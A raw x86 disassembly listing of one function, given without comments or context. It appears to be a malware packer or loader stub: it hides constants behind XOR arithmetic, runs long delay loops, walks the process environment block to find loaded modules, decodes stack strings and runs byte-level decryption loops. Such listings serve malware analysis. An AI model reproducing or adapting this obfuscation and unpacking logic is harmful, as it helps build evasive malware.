  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
